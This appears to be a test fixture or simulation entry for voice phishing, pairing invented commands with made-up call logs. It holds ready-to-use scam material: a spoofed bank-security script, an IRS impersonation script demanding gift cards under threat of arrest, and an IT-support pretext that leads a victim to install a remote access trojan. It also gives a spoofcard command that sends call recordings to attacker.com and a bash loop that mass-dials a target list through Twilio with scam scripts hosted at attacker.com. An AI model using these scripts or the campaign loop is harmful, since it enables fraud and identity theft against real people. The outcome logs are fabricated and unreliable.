name: vishing_voice_phishing
description: Voice phishing (vishing) using VoIP services and voice manipulation

expected_output.example:
Asterisk VoIP call initiated

Dialing: +1 (555) 987-6543
Caller ID: +1-800-CHASE-BANK (spoofed)
Playback: /var/lib/asterisk/sounds/bank_security_message.wav

Call status:
  [00:00:02] Ringing...
  [00:00:08] Call answered
  [00:00:09] Playing automated message:

"Hello, this is Chase Bank Security Department. We detected suspicious activity on your account ending in 4567. For your protection, your card has been temporarily blocked. Press 1 to speak with a security specialist, or press 2 to confirm these transactions were authorized by you."

  [00:00:35] User pressed: 1
  [00:00:36] Transferring to operator (attacker)
  [00:00:37] Operator connected

Call recording: /var/spool/asterisk/monitor/recording_20240115_180045.wav
Duration: 5 minutes 23 seconds
Information collected:
  - Full name: John Michael Doe
  - Card number: 4532-xxxx-xxxx-4567
  - CVV: 789
  - Expiration: 08/26
  - SSN: xxx-xx-6789
  - Date of birth: 03/15/1978

Twilio call initiated via API

Call SID: CA1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p
From: +1-800-555-1234 (IRS spoofed number)
To: +1-555-987-6543
Status: initiated → ringing → in-progress

TwiML script executing: http://attacker.com/twiml/irs_scam.xml

<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say voice="alice">
    This is the Internal Revenue Service. This is your final notice. 
    We have been trying to reach you regarding suspicious tax activity. 
    Press 1 now to speak with an IRS agent, or a warrant will be issued 
    for your arrest within 24 hours.
  </Say>
  <Gather numDigits="1" action="/collect-info">
    <Say>Press 1 to continue.</Say>
  </Gather>
</Response>

Victim pressed: 1
Redirected to: /collect-info (live operator)

Operator script:
  - Claim IRS audit pending
  - Request SSN for verification
  - Demand immediate payment via gift cards
  - Threaten arrest/prosecution

Call outcome:
  Victim provided SSN: xxx-xx-7890
  Payment method: $2,000 in iTunes gift cards
  Card codes: XXXX-XXXX-XXXX (4 cards)

args: spoofcard-cli --from '+15551234567' --to '+15559876543' --voice-changer male-deep --recording-url 'http://attacker.com/record' --message 'Hi, this is David from IT Support. We detected malware on your computer...'

expected_output.example:
SpoofCard vishing call configured:

Original caller ID: +1-555-999-8888 (attacker)
Spoofed caller ID: +1-555-123-4567 (IT department number)
Target: +1-555-987-6543 (victim)
Voice modification: Male deep (sounds more authoritative)
Call recording: Enabled → http://attacker.com/record

Call in progress:

Attacker: "Hi, this is David from IT Support. We detected malware on your computer that's trying to access our corporate network. I need you to install our security software immediately."

Victim: "Oh no, really? What should I do?"

Attacker: "I'm going to send you a link via text message. Please install the software right away. It will ask for admin password - that's normal for security software."

Victim: "Okay, let me check... I got the link."

Attacker: "Great. Go ahead and install it, I'll wait on the line."

[Victim installs remote access trojan (RAT)]

Outcome:
  ✓ RAT installed on victim computer
  ✓ Admin credentials captured
  ✓ Full remote access established
  ✓ Corporate network access obtained

args:
cat > vishing_campaign.sh << 'EOF'
#!/bin/bash
while IFS=',' read -r name phone email company; do
  echo "[*] Calling $name at $phone ($company)"
  twilio api:core:calls:create \
    --from="+18005551111" \
    --to="$phone" \
    --url="http://attacker.com/twiml/verify.xml?name=$name&company=$company"
  sleep 30
done < targets.csv
EOF
chmod +x vishing_campaign.sh
./vishing_campaign.sh

expected_output.example:
Automated vishing campaign started
Target list: targets.csv (50 entries)

[*] Calling John Doe at +15551111111 (Acme Corp)
Call initiated: CA_abc123
TwiML: Personalized message with name "John" and company "Acme Corp"
Status: completed (3m 45s)
Result: Victim provided credentials

[*] Calling Jane Smith at +15552222222 (TechStart Inc)
Call initiated: CA_def456
Status: no-answer
Result: Voicemail left

[*] Calling Bob Johnson at +15553333333 (Finance Plus)
Call initiated: CA_ghi789
Status: completed (7m 12s)
Result: Victim suspicious, hung up

... [47 more calls]

Campaign statistics:
  Total calls: 50
  Answered: 35 (70%)
  Voicemail: 10 (20%)
  No answer: 5 (10%)
  
  Successful credential harvesting: 18 (36% of total, 51% of answered)
  Suspicious/hung up: 12 (24%)
  Completed but no info: 5 (10%)

Harvested data:
  - 18 sets of login credentials
  - 12 credit card numbers
  - 8 social security numbers
  - 15 email addresses confirmed
